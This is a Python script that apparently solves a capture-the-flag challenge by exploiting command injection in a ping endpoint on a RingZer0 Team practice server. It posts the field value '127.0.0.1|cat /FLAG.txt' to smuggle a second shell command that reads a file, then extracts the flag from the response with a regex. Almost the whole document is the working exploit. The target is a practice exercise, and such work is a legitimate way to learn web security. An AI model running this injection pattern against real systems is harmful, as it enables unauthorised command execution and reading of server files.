import requests
import re
import time

# Target URL for the ping endpoint
url = "http://challenges.ringzer0team.com:10190/ping"

# Craft payload using pipe operator to execute command after ping
payload = "127.0.0.1|cat%20/FLAG.txt"  # Using URL encoded space

# Prepare POST data
post_data = {'ip_address': '127.0.0.1|cat /FLAG.txt'}

# Set required headers
headers = {
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
}

try:
    print(f"[+] Connecting to: {url}")
    print(f"[+] Attempting to exploit command injection...")
    print(f"[+] Data: {post_data}\n")
    
    response = requests.post(
        url, 
        data=post_data, 
        headers=headers, 
        timeout=20,
        allow_redirects=True
    )
    
    print(f"[+] Status: {response.status_code}")
    print(f"[+] Response length: {len(response.text)} bytes\n")
    
    # Print the full response
    print("[+] Full Response:")
    print(response.text)
    
    # Extract flag if present
    flag_match = re.search(r'FLAG\{[^}]+\}', response.text)
    if flag_match:
        print(f"\n[!] FLAG FOUND: {flag_match.group(0)}")
    else:
        print("\n[!] No flag pattern found")
        
except requests.exceptions.ConnectionError as e:
    print(f"[-] Connection Error: {e}")
    print("[-] Possible causes: DNS failure, refused connection, or network issue")
except requests.exceptions.Timeout as e:
    print(f"[-] Timeout Error: {e}")
    print("[-] Connection timed out - target may be slow or unreachable")
except Exception as e:
    print(f"[-] Exception occurred: {type(e).__name__}: {e}")
    import traceback
    print(traceback.format_exc())
